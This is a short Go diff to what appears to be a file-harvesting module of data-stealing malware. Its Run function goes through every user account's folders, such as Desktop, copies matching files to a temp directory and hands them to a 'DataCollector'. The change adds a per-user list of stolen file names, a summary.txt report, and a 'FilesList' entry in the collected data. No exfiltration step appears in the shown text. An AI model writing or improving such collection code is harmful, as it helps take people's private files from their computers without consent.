@@ -80,6 +80,8 @@ func Run(dataCollector *collector.DataCollector) {
 	}
 
 	found := 0
+	var foundFiles []string
+	
 	for _, user := range hardware.GetUsers() {
 		for _, dir := range []string{
 			filepath.Join(user, "Desktop"),
@@ -121,6 +123,7 @@ func Run(dataCollector *collector.DataCollector) {
 						if err != nil {
 							continue
 						}
+						foundFiles = append(foundFiles, fmt.Sprintf("%s - %s", strings.Split(user, "\\")[2], info.Name()))
 						break
 					}
 					found++
@@ -135,10 +138,19 @@ func Run(dataCollector *collector.DataCollector) {
 		return
 	}
 
-	// Add common files data to collector
+	// Create summary file
+	summaryFile := filepath.Join(tempDir, "summary.txt")
+	fileutil.AppendFile(summaryFile, fmt.Sprintf("Total files found: %d", found))
+	fileutil.AppendFile(summaryFile, "")
+	fileutil.AppendFile(summaryFile, "Files list:")
+	for _, file := range foundFiles {
+		fileutil.AppendFile(summaryFile, file)
+	}
+
+	// Add common files data to collector  
 	filesInfo := map[string]interface{}{
 		"FilesFound": found,
-		"TreeView":   fileutil.Tree(tempDir, ""),
+		"FilesList":  foundFiles,
 	}
 	dataCollector.AddData("commonfiles", filesInfo)
 	dataCollector.AddDirectory("commonfiles", tempDir, "common_files")
